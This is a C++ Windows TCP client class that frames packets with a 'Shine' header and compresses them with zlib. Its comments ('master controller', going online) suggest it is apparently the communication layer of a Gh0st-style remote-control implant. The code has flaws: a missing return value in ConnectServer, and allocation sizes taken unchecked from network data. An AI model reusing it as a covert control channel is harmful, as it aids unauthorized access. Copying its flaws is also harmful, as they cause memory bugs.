#include "pch.h"
#include "IocpClient.h"

CIocpClient::CIocpClient()
{
	//初始化套接字类库
	WSADATA v1;
	if (WSAStartup(MAKEWORD(2, 2), &v1) != 0)
	{
		return;
	}
	
	//通信套接字
	m_ClientSocket = INVALID_SOCKET;
	memcpy(m_PacketHeaderFlag, "Shine", PACKET_FLAG_LENGTH);
	m_WorkThreadHandle = NULL;
	m_EventHandle = CreateEvent(NULL, TRUE, FALSE, NULL);

}

CIocpClient::~CIocpClient()
{
	if (m_ClientSocket != INVALID_SOCKET)
	{
		closesocket(m_ClientSocket);
		m_ClientSocket = INVALID_SOCKET;
	}

	//关闭工作线程句柄
	if (m_WorkThreadHandle != NULL)
	{
		CloseHandle(m_WorkThreadHandle);
		m_WorkThreadHandle = NULL;
	}
	//关闭事件
	if (m_EventHandle != NULL)
	{
		CloseHandle(m_EventHandle);
		m_EventHandle = NULL;
	}


	WSACleanup();
}

BOOL CIocpClient::ConnectServer(char* ServerAddress, unsigned short ConnectPort)
{
	//生成一个通信套接字
	m_ClientSocket = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
	if (m_ClientSocket == SOCKET_ERROR)
	{
		return FALSE;
	}
	//构造sockaddr_in结构也就是Server的IPAddress结构
	sockaddr_in	v1;
	v1.sin_family = AF_INET;
	v1.sin_port = htons(ConnectPort);
	v1.sin_addr.S_un.S_addr = inet_addr(ServerAddress);
	//链接服务器
	BOOL connectOk = connect(m_ClientSocket, (SOCKADDR*)&v1, sizeof(sockaddr_in));
	BOOL lastError = GetLastError();
	if (connectOk == SOCKET_ERROR)
	{
		int LastError = WSAGetLastError();
		if (m_ClientSocket != INVALID_SOCKET)
		{
			closesocket(m_ClientSocket);
			m_ClientSocket = INVALID_SOCKET;
		}
		return FALSE;
	}

	//服务器到客户端的数据
	m_WorkThreadHandle = (HANDLE)CreateThread(NULL, 0,
		(LPTHREAD_START_ROUTINE)WorkThreadProcedure, (LPVOID)this, 0, NULL);   //接收数据
}

DWORD WINAPI CIocpClient::WorkThreadProcedure(LPVOID ParameterData)
{
	CIocpClient* v1 = (CIocpClient*)ParameterData;

	//通信模型 选择模型
	fd_set OldSocketSet;
	fd_set NewSocketSet;
	FD_ZERO(&OldSocketSet);
	FD_ZERO(&NewSocketSet);

	//接收数据内存
	char bufferData[PACKET_LENGTH] = { 0 };

	//将上线通信套接字放入到集合中
	FD_SET(v1->m_ClientSocket, &OldSocketSet);
	while (v1->IsReceiving()) 
	{
		NewSocketSet = OldSocketSet;
		//服务器如果没有数据发送，客户端将阻塞在select中
		//通过select的返回值来阻塞  select正常会返回准备好的文件描述符数量
		//select超时则返回0   出错则返回-1
		int IsOk = select(NULL, &NewSocketSet, NULL, NULL, NULL);	//阻塞函数
		if (IsOk == SOCKET_ERROR)
		{	
			v1->Disconnect();
			printf("IsReceiving关闭\r\n");
			break;
		}

		if (IsOk > 0)
		{
			memset(bufferData, 0, sizeof(bufferData));
			int bufferLength = recv(v1->m_ClientSocket, bufferData, sizeof(bufferData), 0);
			if (bufferLength <= 0)
			{
				printf("WorkThreadProcedure(接收数据):主控端关闭我了\r\n");
				v1->Disconnect();
				break;
			}

			if (bufferLength > 0)
			{
				v1->OnReceiving((char*)bufferData, bufferLength);
			}
		}


	}


	return 0;
}

VOID CIocpClient::Disconnect()
{
	CancelIo((HANDLE)m_ClientSocket);
	InterlockedExchange((LPLONG)&m_IsReceiving, FALSE);
	//m_IsReceiving = FALSE;
	closesocket(m_ClientSocket);
	SetEvent(m_EventHandle);
	m_ClientSocket = INVALID_SOCKET;
}


VOID CIocpClient::OnReceiving(char* BufferData, ULONG BufferLength)
{
	//数据进行解压
//接到的数据进行解压缩
	try
	{
		if (BufferLength == 0)
		{
			Disconnect();       //错误处理
			return;
		}
		//将接收到的数据存储到m_ReceivedCompressedBufferData
		m_ReceivedBufferDataCompressed.WriteArray((LPBYTE)BufferData, BufferLength);

		//检测数据是否大于数据头大小如果不是那就不是正确的数据
		while (m_ReceivedBufferDataCompressed.GetArrayLength() > PACKET_HEADER_LENGTH)
		{
			char v1[PACKET_FLAG_LENGTH] = { 0 };
			CopyMemory(v1, m_ReceivedBufferDataCompressed.GetArray(), PACKET_FLAG_LENGTH);
			//判断数据头
			if (memcmp(m_PacketHeaderFlag, v1, PACKET_FLAG_LENGTH) != 0)
			{
				throw "Bad Buffer";
			}

			ULONG PackTotalLength = 0;
			CopyMemory(&PackTotalLength, m_ReceivedBufferDataCompressed.GetArray(PACKET_FLAG_LENGTH),
				sizeof(ULONG));

			//数据的大小正确判断
			if (PackTotalLength &&
				(m_ReceivedBufferDataCompressed.GetArrayLength()) >= PackTotalLength)
			{


				m_ReceivedBufferDataCompressed.ReadArray((PBYTE)v1, PACKET_FLAG_LENGTH);

				m_ReceivedBufferDataCompressed.ReadArray((PBYTE)&PackTotalLength, sizeof(ULONG));

				ULONG DecompressedLength = 0;
				m_ReceivedBufferDataCompressed.ReadArray((PBYTE)&DecompressedLength, sizeof(ULONG));


				ULONG CompressedLength = PackTotalLength - PACKET_HEADER_LENGTH;
				PBYTE CompressedData = new BYTE[CompressedLength];
				PBYTE DecompressedData = new BYTE[DecompressedLength];


				if (CompressedData == NULL || DecompressedData == NULL)
				{
					throw "Bad Allocate";

				}

				m_ReceivedBufferDataCompressed.ReadArray(CompressedData, CompressedLength);
				int	IsOk = uncompress(DecompressedData,
					&DecompressedLength, CompressedData, CompressedLength);


				if (IsOk == Z_OK)//如果解压成功
				{
					m_ReceivedBufferDataDecompressed.ClearArray();
					m_ReceivedBufferDataDecompressed.WriteArray(DecompressedData,
						DecompressedLength);


					delete[] CompressedData;
					delete[] DecompressedData;



					//MessageBox(NULL, 0, 0, 0);
					//注意这里
					// 
					//虚拟多态
					m_Manager->HandleIo((PBYTE)m_ReceivedBufferDataDecompressed.GetArray(0),
						m_ReceivedBufferDataDecompressed.GetArrayLength());
				}
				else
				{
					delete[] CompressedData;
					delete[] DecompressedData;
					throw "Bad Buffer";
				}

			}
			else
				break;
		}
	}
	catch (...)
	{
		m_ReceivedBufferDataCompressed.ClearArray();
		m_ReceivedBufferDataDecompressed.ClearArray();
	}

}

int CIocpClient::OnSending(char* BufferData, ULONG BufferLength)
{
	m_SendBufferDataCompressed.ClearArray();

	if (BufferLength > 0)
	{
		//有13个字节是不参与压缩的    
		unsigned long	CompressedLength = (double)BufferLength * 1.001 + 12;   //100 * 1.001 + 12
		LPBYTE			CompressedData = new BYTE[CompressedLength];   //动态申请内存

		if (CompressedData == NULL)
		{
			return 0;
		}
		//微软的官方类库
		int	IsOk = compress(CompressedData, &CompressedLength, (PBYTE)BufferData, BufferLength);

		if (IsOk != Z_OK)
		{
			//数据压缩失败
			delete[] CompressedData;   //销毁内存
			return FALSE;
		}

		//计算数据包总长
		ULONG PackTotalLength = CompressedLength + PACKET_HEADER_LENGTH;
		m_SendBufferDataCompressed.WriteArray((PBYTE)m_PacketHeaderFlag, sizeof(m_PacketHeaderFlag));
		//Shine
		m_SendBufferDataCompressed.WriteArray((PBYTE)&PackTotalLength, sizeof(ULONG));
		//ShinePackTotalLength
		m_SendBufferDataCompressed.WriteArray((PBYTE)&BufferLength, sizeof(ULONG));
		//ShinePackTotalLengthBufferLength
		m_SendBufferDataCompressed.WriteArray(CompressedData, CompressedLength);
		//[Shine][PackTotalLength][BufferLength][........(压缩后的真实数据)]

		delete[] CompressedData;   //销毁内存
		CompressedData = NULL;

	}

	//分段发送数据
	return SendWithSplit((char*)m_SendBufferDataCompressed.GetArray(),
		m_SendBufferDataCompressed.GetArrayLength(),
		MAX_SEND_BUFFER);

}

BOOL CIocpClient::SendWithSplit(char* BufferData, ULONG BufferLength, ULONG SplitLength)
{
	int			 ReturnLength = 0;
	const char* Travel = (char*)BufferData;
	int			 i = 0;
	ULONG		 Sended = 0;
	ULONG		 SendRetry = 15;
	int          j = 0;

	for (i = BufferLength; i >= SplitLength; i -= SplitLength)
	{
		for (j = 0; j < SendRetry; j++)  //确保数据每次能够成功 对每一段数据的15发送
		{
			ReturnLength = send(m_ClientSocket, Travel, SplitLength, 0);   //同步函数
			if (ReturnLength > 0)
			{
				break;//发送成功退出 该段数据发送
			}
		}

		if (j == SendRetry)
		{
			return FALSE;   //完犊子
		}

		Sended += SplitLength;
		Travel += ReturnLength;
		Sleep(15);
	}

	//0x9000  0x2000   2000 2000 2000 2000 1000
	if (i > 0)
	{
		for (int j = 0; j < SendRetry; j++)
		{
			ReturnLength = send(m_ClientSocket, (char*)Travel, i, 0);

			Sleep(15);
			if (ReturnLength > 0)
			{
				break;
			}
		}
		if (j == SendRetry)
		{
			return FALSE;
		}
		Sended += ReturnLength;
	}
	if (Sended == BufferLength)
	{
		return TRUE;   //整个数据发送完毕
	}
	else
	{
		return FALSE;
	}
}
